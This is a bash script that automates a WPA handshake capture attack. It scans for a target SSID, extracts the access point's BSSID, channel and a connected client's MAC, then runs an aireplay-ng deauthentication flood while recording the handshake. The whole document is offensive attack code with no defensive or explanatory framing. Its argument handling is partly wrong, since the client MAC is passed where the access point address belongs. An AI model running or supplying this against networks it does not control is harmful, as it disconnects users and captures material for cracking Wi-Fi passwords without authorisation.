#!/bin/bash

# Function to clean up background processes
cleanup() {
    pkill airodump-ng
    echo "Cleanup completed"
}
trap cleanup EXIT

sudo airmon-ng check kill
sudo airmon-ng start wlan1

# Ask for SSID
echo -n "Enter the SSID: "
read SSID

# Run airodump-ng to scan for the SSID
echo "Scanning for SSID: $SSID"
sudo airodump-ng wlan1 > /tmp/airodump_output.txt &

# Give it some time to capture data
sleep 15

pkill airodump-ng

# Get the BSSID and channel
BSSID=$(grep "$SSID" /tmp/airodump_output.txt | awk '{print $1}')
CHANNEL=$(grep "$SSID" /tmp/airodump_output.txt | awk '{print $7}')

echo "Found BSSID: $BSSID, Channel: $CHANNEL"

# Run airodump-ng with the BSSID and channel
sudo airodump-ng --bssid $BSSID --channel $CHANNEL -w $SSID wlan1 > /tmp/airodump_filtered_output.txt &

# Let it run for 20 seconds
sleep 20

pkill airodump-ng

# Get the MAC address of a client
STATION=$(grep -A 5 "STATION" /tmp/airodump_filtered_output.txt | tail -n 1 | awk '{print $1}')
echo "Found Client STATION: $STATION"

# Run airodump-ng again
sudo airodump-ng --bssid $BSSID --channel $CHANNEL -w $SSID wlan1 > /tmp/airodump_final_output.txt &

# Run aireplay-ng for deauth attack
sudo aireplay-ng --deauth 20 -b $BSSID -a $STATION wlan1 &

# Check for WPA handshake in the output
HANDSHAKE_FOUND=0
SECONDS_WAITED=0
while [ $SECONDS_WAITED -lt 30 ]; do
    if grep -q "WPA handshake" /tmp/airodump_final_output.txt; then
        HANDSHAKE_FOUND=1
        break
    fi
    sleep 1
    SECONDS_WAITED=$((SECONDS_WAITED + 1))
done

if [ $HANDSHAKE_FOUND -eq 1 ]; then
    echo "WPA Handshake found, waiting for 10 more seconds..."
    sleep 10
else
    echo "WPA Handshake not found within the timeout period."
fi

# Cleanup
cleanup
